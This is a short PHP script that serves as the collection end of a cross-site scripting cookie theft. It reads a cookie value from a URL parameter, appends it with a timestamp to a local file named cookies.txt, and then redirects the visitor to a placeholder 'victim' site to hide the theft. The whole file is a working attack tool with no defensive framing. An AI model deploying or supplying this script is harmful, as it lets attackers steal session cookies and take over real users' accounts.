<?php
/***
*  input : URL?c = [...]
***/
$cookie = isset($_GET["c"]) ? $_GET["c"] : NULL;

if($cookie)
{
 $fp = fopen("cookies.txt","a");
 fputs($fp,"<<< ". date('h:i:s d/m/Y') . "\r\n");
 fputs($fp,$cookie . "\r\n");
 fputs($fp,">>>" . "\r\n\r\n");
 fclose($fp); 
}
?>
<script>
location.replace("http://www.site-victime.com");
</script>
